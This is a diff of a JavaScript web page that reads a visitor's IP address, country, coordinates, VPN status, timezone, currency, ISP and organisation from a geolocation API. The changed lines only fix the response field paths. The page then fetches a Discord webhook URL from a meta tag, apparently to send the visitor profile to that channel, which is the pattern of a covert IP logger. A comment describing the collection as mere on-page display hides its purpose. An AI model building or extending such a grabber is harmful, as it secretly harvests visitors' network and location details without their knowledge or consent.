@@ -19,7 +19,7 @@
         // display the IP address on the page
         const ip = data.ip_address
         const country = data.country
-        const flag = data.emoji
+        const flag = data.flag.emoji
         const countrycode = data.country_code
         const countrygeo = data.country_geoname_id
         const continent = data.continent
@@ -27,16 +27,16 @@
         const continentgeo = data.continent_geoname_id
         const longitude = data.longitude
         const latitude = data.latitude
-        const vpn = data.is_vpn
-        const timezonename = data.name
-        const nameabbreviation = data.abbreviation
-        const currentime = data.current_time
-        const currency = data.currency_name
-        const currencycode = data.currency_code
-        const operateur = data.autonomous_system_organization
-        const typedeco = data.connection_type
-        const isp = data.isp_name
-        const organame = data.organization_name
+        const vpn = data.security.is_vpn
+        const timezonename = data.timezone.name
+        const nameabbreviation = data.timezone.abbreviation
+        const currentime = data.timezone.current_time
+        const currency = data.currency.currency_name
+        const currencycode = data.currency.currency_code
+        const operateur = data.connection.autonomous_system_organization
+        const typedeco = data.connection.connection_type
+        const isp = data.connection.isp_name
+        const organame = data.connection.organization_name
 
         // get the Discord webhook URL from the meta tag
         const webhookUrl = document.querySelector('meta[name="discord-webhook"]').content;
